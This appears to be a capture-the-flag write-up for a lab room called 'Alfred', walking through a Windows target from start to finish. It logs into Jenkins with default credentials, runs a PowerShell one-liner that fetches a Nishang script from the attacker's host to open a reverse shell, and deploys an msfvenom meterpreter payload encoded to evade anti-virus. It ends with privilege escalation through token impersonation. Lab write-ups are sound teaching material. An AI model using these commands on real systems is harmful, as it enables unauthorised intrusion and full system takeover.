# Alfred

[TOC]

## Introduction

In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we'll use an interesting privilege escalation method to get full system access. 

## Basic Information

Target IP: 10.10.163.51

## Initial Access

Upon an initial nmap scan we can see that the target has 3 open ports:

```
nmap $ip
```

> PORT     STATE SERVICE
> 80/tcp   open  http
> 3389/tcp open  ms-wbt-server
> 8080/tcp open  http-proxy

Let's explore both websites hosted on port 80 and 8080.

1. The first one showcases a simple static webpage with an email address: `alfred@wayenterprises.com`

2. The second one showcases a login panel. Before trying to bruteforce let us try a couple of educated guesses.

After a quick google search users say that the default username for jenkins is admin. This makes sense, since this is an administration portal for a service and the username hint from THM is 5 characters long. 

Let's try `admin:admin`

Amazing! We are in.

If we explore extensively enough we will find we can run commands on the target server. If we enter the `project` and `Configure` there is a field where we can write code to and it will be ran on the server.

The target is a Windows Server, hence we know that we can run a command that connects the target to out local listener. In order to do this, we will need  the [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) script to connect back to our machine.

Start a local HTTP server on our machine with the file in the current directory.

```
python3 -m http.server <port1>
```

We start a netcat listener on our machine before the next step which connects back to our listener

```
nc -lnvp <port2>
```

Afterwards we run this command on the server which does 2 things:

1. It downloads the script to the server machine
2. Invokes the 'Invoke-PowershellTCP' function with the reverse option and a specific IP and Port supplied.

```
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:port1/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port port2
```

Great! We know have a working shell.

**Question** What is the user.txt flag? 

> <Redacted>

## Switching Shells

To make the next step, privilege escalation, easier we can use our current shell to spawn a meterpreter shell using the payload /windows/meterpreter/reverse_tcp and the multi/handler exploit.

Note: The command bellow generates an encoded x86-64 reverse tcp meterpreter payload. Encoding payloads not only ensures that they are transmitted correctly, bue it also helps them to evade anti-virus products.

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe

powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:80/shell-name.exe','shell-name.exe')"

use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST your-ip 
set LPORT listening-port 
run

Start-Process "shell-name.exe"
```

We can see in the command output the size of the generated payload.

> [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
> Found 1 compatible encoders
> Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
> x86/shikata_ga_nai succeeded with size 381 (iteration=0)
> x86/shikata_ga_nai chosen with final size 381
> Payload size: 381 bytes
> Final size of exe file: 73802 bytes
> Saved as: alfred.exe

**Question** What is the final size of the exe payload that you generated?

> 73802

## Privilege Escalation

For our next step we will use token impersonation to gain system access.

In order to do this we have to view all the privileges.

We can do it by switching to a powershell session and running a specific command:

```
load powershell
powershell_shell

whoami /priv
```

> Privilege Name                  Description                               State
> =============================== ========================================= ========
> SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
> SeSecurityPrivilege             Manage auditing and security log          Disabled
> SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
> SeLoadDriverPrivilege           Load and unload device drivers            Disabled
> SeSystemProfilePrivilege        Profile system performance                Disabled
> SeSystemtimePrivilege           Change the system time                    Disabled
> SeProfileSingleProcessPrivilege Profile single process                    Disabled
> SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
> SeCreatePagefilePrivilege       Create a pagefile                         Disabled
> SeBackupPrivilege               Back up files and directories             Disabled
> SeRestorePrivilege              Restore files and directories             Disabled
> SeShutdownPrivilege             Shut down the system                      Disabled
> **SeDebugPrivilege                Debug programs                            Enabled**
> SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
> SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
> SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
> SeUndockPrivilege               Remove computer from docking station      Disabled
> SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
> **SeImpersonatePrivilege          Impersonate a client after authentication Enabled**
> SeCreateGlobalPrivilege         Create global objects                     Enabled
> SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
> SeTimeZonePrivilege             Change the time zone                      Disabled
> SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled

You can see that two privileges (SeDebugPrivilege, SeImpersonatePrivilege) are enabled.

We can exploit this with the incognito metasploit module.

In order to do this we have to kill our powershell session, return to meterpreter and run:

```
load incognito
```

To check which tokens are available we can run

```
list_tokens -g
```

> BUILTIN\Administrators

Since this token is available we can impersonate it by running:

```
impersonate_token "BUILTIN\Administrators"
getuid
```

> NT AUTHORITY\SYSTEM

This does not mean we acctually have the permissions of a privileged user, since the Primary Token of the process is what is verified to know what a process is allowed to do. Hence, we have to migrate to another process with the correct permissions.

We can do this by running:

```
ps
migrate <pid>
```

Great! We can know read the root.txt flag.

```
cat "C:\Windows\system32\config\root.txt"
```

> <Redacted>
